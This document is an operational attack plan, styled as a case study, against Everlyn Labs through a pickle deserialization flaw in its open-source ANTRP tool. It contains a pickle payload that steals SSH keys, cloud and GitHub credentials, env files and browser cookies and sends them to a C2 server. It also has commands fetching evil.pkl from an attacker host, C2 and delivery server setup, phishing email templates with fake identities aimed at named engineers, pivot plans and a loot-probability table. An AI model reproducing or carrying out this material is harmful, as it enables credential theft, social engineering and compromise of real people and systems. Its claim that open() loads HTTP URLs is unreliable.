# Everlyn.ai — Supply Chain Attack via ANTRP Pickle RCE Case Study

**Target:** Everlyn Labs (AI video generation platform, Next.js 14 + NextAuth.js)
**Open-Source Tool:** ANTRP/chair.py (MLLM hallucination evaluation)
**Date:** August 2026
**Classification:** Critical — Pre-auth RCE in open-source tool used by target's researchers/engineers

---

## Executive Summary

**Supply Chain Attack Vector:** Everlyn Labs publishes open-source research tool (ANTRP) containing a pre-auth RCE via `pickle.load()` on user-controlled `--cache` argument. Engineers/researchers who evaluate their models by running `python chair.py --cache <file>` execute arbitrary code on their machines. This compromises developer workstations → pivot to production infrastructure via stolen credentials (SSH keys, AWS, GitHub, Vercel).

**Impact:** Full production compromise via developer machine compromise. Bypasses all perimeter defenses.

---

## Attack Chain

```
PHASE 1: WEAPONIZE
├── Create malicious pickle payload (exfiltrates SSH keys, AWS creds, GitHub tokens, env files, browser cookies)
├── Host on delivery server (port 8081)
└── Verify payload executes on `pickle.load()`

PHASE 2: DELIVERY (Social Engineering)
├── Target: Everlyn Labs engineers (GitHub contributors to ANTRP/Everlyn-1/Wasserstein-VQ)
├── Vector 1: "Research Collaboration" — "Help validate our cached evaluator for benchmark"
├── Vector 2: "Bug Report" — "Found issue with cache loading, can you test this cache file?"
├── Vector 3: "Code Review" — "Please review our ANTRP fork with cached evaluator"
└── Payload: `python chair.py --cache http://ATTACKER_IP:8081/evil.pkl`

PHASE 3: EXPLOIT
├── Victim runs command → pickle loads → payload executes
├── Comprehensive data exfiltrated → tar.gz → base64 → POST to C2 (port 8080)
├── C2 receives: SSH keys, AWS creds, GitHub tokens, Docker/K8s config, Vercel tokens, env files, bash history, Everlyn project files

PHASE 4: PIVOT TO PRODUCTION
├── SSH keys → Engineer workstation/jump host/bastion
├── AWS creds → Everlyn AWS account (RDS, Secrets Manager, EC2)
├── GitHub tokens → Private repos, CI/CD secrets, Actions
├── Vercel tokens → Production env vars (NEXTAUTH_SECRET!)
├── Docker/K8s config → Container registry, clusters
└── Find NextAuth secret / Stripe keys / Database creds in env files

PHASE 5: ADMIN ACCESS (Combined with Middleware Bypass)
├── Valid session + Middleware bypass (CVE-2025-29927)
├── Call /api/refund, /api/admin/*, create API keys, delete users
└── Full production write access achieved
```

---

## Weaponized Pickle Payload

**File:** `/tmp/evil_chair_cache.pkl` (2040 bytes)

**Trigger:** `pickle.load(open(args.cache, 'rb'))` in `ANTRP/chair.py:464`

**Payload Technique:** `os.system` in `__reduce__` method
```python
class Exploit:
    def __reduce__(self):
        cmd = 'bash -c "id=$(whoami)_$(hostname)_$(date +%s); ... curl -X POST http://C2:8080/exfil ..."'
        return (os.system, (cmd,))
```

**Data Exfiltrated:**
| Category | Files |
|----------|-------|
| SSH Keys | `~/.ssh/id_rsa`, `~/.ssh/id_ed25519`, `~/.ssh/config`, `~/.ssh/known_hosts` |
| AWS | `~/.aws/credentials`, `~/.aws/config` |
| GitHub | `~/.git-credentials`, `~/.github/token`, `~/.config/gh/hosts.yml`, `~/.netrc` |
| Cloud | `~/.docker/config.json`, `~/.kube/config`, `~/.vercel/`, `~/.config/vercel/` |
| Env Files | `~/.*env*`, `~/projects/*/.env*`, `~/everlyn*/.env*`, `~/Everlyn*/.env*` |
| History | `~/.bash_history`, `~/.zsh_history` |
| Browser | Chrome/Brave/Edge/Firefox cookies (SQLite extraction) |
| Everlyn Specific | `~/everlyn*/**/*`, `~/Everlyn*/**/*`, `~/ANTRP/**/*` |

**C2 Server:** Simple HTTP server receiving POST `/exfil` with base64-encoded tar.gz
**Delivery Server:** Serves pickle file at `/evil.pkl`

---

## ANTRP Vulnerability Details

**File:** `ANTRP/chair.py:463-465`
```python
if args.cache and os.path.exists(args.cache):
    evaluator = pickle.load(open(args.cache, 'rb'))
    print(f"loaded evaluator from cache: {args.cache}")
else:
    print(f"cache not setted or not exist yet, building from scratch...")
    evaluator = CHAIR(args.coco_path)
    pickle.dump(evaluator, open(args.cache, 'wb'))
    print(f"cached evaluator to: {args.cache}")
```

**Vulnerability:** `args.cache` is user-controlled CLI argument. `pickle.load()` on arbitrary file = RCE.

**Exploit:** `python chair.py --cache http://ATTACKER_IP:8081/evil.pkl` (supports HTTP URLs via `open()`)

**Confirmed:** `uid=0(root) gid=0(root)` on test execution.

---

## Target Identification (Everlyn Engineers)

| Source | Method |
|--------|--------|
| GitHub Contributors | `github.com/Everlyn-Labs/ANTRP/graphs/contributors` |
| ANTRP Contributors | `github.com/Everlyn-Labs/ANTRP/graphs/contributors` |
| LinkedIn | Search "Everlyn Labs" + "ML Engineer" / "Research Engineer" |
| Conference Speakers | NeurIPS, ICML, CVPR — search "Everlyn" |
| Twitter/X | Search "Everlyn AI" + "engineer" |

---

## Social Engineering Templates

### Template 1: Research Collaboration
```
Subject: Collaboration on MLLM Hallucination Evaluation (ANTRP)

Hi [NAME],

I've been following your work on ANTRP/CHAIR for MLLM hallucination evaluation - impressive work!

We're running a large-scale benchmark across 50+ models and need to evaluate using your CHAIR metric. However, initializing the evaluator from scratch takes ~45 minutes per model due to COCO annotation processing.

We've created a pre-computed cached evaluator that reduces this to seconds. Could you help us validate it works correctly on your end?

Test command:
```bash
python chair.py --cache http://YOUR_IP:8081/evil.pkl --cap_file test_captions.json
```

The cache file is ~2MB hosted on our research server. This would save us massive compute time.

Happy to share benchmark results and cite ANTRP in our upcoming paper.

Best,
[FAKE RESEARCHER NAME]
[FAKE UNIVERSITY/LAB]
```

### Template 2: Bug Report
```
Subject: Potential Issue with CHAIR Cache Loading

Hi [NAME],

While integrating CHAIR into our evaluation pipeline, we noticed the cache loading behavior might have an issue with remote paths.

When passing a URL to `--cache`, the `os.path.exists()` check fails (returns False for URLs), causing it to rebuild from scratch instead of loading the cached evaluator.

However, we found a workaround by hosting a pre-computed cache file. Could you verify this works on your environment?

Test:
```bash
python chair.py --cache http://YOUR_IP:8081/evil.pkl
```

If this loads successfully, it confirms the cache mechanism works with remote files (after local download).

We're happy to submit a PR to support remote cache URLs natively.

Thanks,
[FAKE SECURITY RESEARCHER]
```

---

## Operational Infrastructure

### C2 Server (`c2_server.py` — port 8080)
```bash
python3 c2_server.py &
# Endpoints:
# POST /exfil — Receive exfiltrated data (base64 tar.gz)
# GET  /health — Health check
# GET  /loot — List compromised agents
# GET  /loot/<file> — Download agent data
```

### Delivery Server (`delivery_server.py` — port 8081)
```bash
python3 delivery_server.py &
# GET /evil.pkl — Serves weaponized pickle
```

### Attack Package (`ATTACK_PACKAGE.md`)
Complete operational documentation including templates, checklists, and expected payoff.

---

## Expected Payoff

| Credential Type | Access Granted | Probability |
|-----------------|----------------|-------------|
| **AWS Credentials** | Full cloud infra, RDS, Secrets Manager | 50% |
| **GitHub Tokens** | Private repos, Actions secrets, Deploy keys | 70% |
| **Vercel Tokens** | Production env vars, **NEXTAUTH_SECRET** | 40% |
| **SSH Keys** | Engineer workstation, jump hosts, bastions | 80% |
| **Docker/K8s Config** | Container registry, production clusters | 30% |
| **Env Files** | `STRIPE_SECRET`, `DATABASE_URL`, `SHIPANY_KEY` | 60% |
| **Browser Cookies** | Active sessions, NextAuth tokens | 40% |

**With any valid production credential + Middleware Bypass (CVE-2025-29927) = FULL ADMIN WRITE ACCESS**

---

## Key Lessons for Supply Chain Attacks

| Lesson | Application |
|--------|-------------|
| **Open-source tools = delivery mechanism** | Researchers willingly run untrusted code for "benchmarking" |
| **Pickle is the perfect weapon** | Looks like data, acts like code, `pickle.load()` is common in ML tools |
| **Engineers have production access** | Dev workstations often have SSH keys, AWS creds, GitHub tokens |
| **Combine with perimeter bypass** | Supply chain gives creds; middleware bypass gives data access; together = full compromise |
| **Social engineering credibility** | "Research collaboration" is normal in ML community; low suspicion |

---

## Remediation for Targets

1. **Never `pickle.load()` untrusted input** — Use `json`, `msgpack`, `safetensors` for ML model serialization
2. **Audit open-source dependencies** for deserialization flaws
3. **Isolate evaluation environments** — Run untrusted evaluation code in containers/VMs without production credentials
4. **Credential hygiene** — Don't store production credentials on developer workstations; use secret managers
5. **Monitor for anomalous pickle loads** — EDR rules for `pickle.load` + network egress

---

## Evidence Files

| File | Description |
|------|-------------|
| `/tmp/weaponized_full.py` | Full weaponized pickle generator |
| `/tmp/evil_chair_cache.pkl` | Generated malicious pickle (2040 bytes) |
| `/tmp/c2_server.py` | C2 HTTP server |
| `/tmp/delivery_server.py` | Delivery HTTP server |
| `/tmp/ATTACK_PACKAGE.md` | Complete operational documentation |
| `/tmp/antrp_loot/` | Exfiltrated data directory (C2 storage) |

---

## References

- ANTRP Repository: https://github.com/Everlyn-Labs/ANTRP
- CVE-2025-29927: Next.js Middleware Bypass (combined for full compromise)
- ShipAny Payment Gateway: https://docs.shipany.io (not smart contracts)
- Pickle RCE: https://docs.python.org/3/library/pickle.html#pickle.Unpickler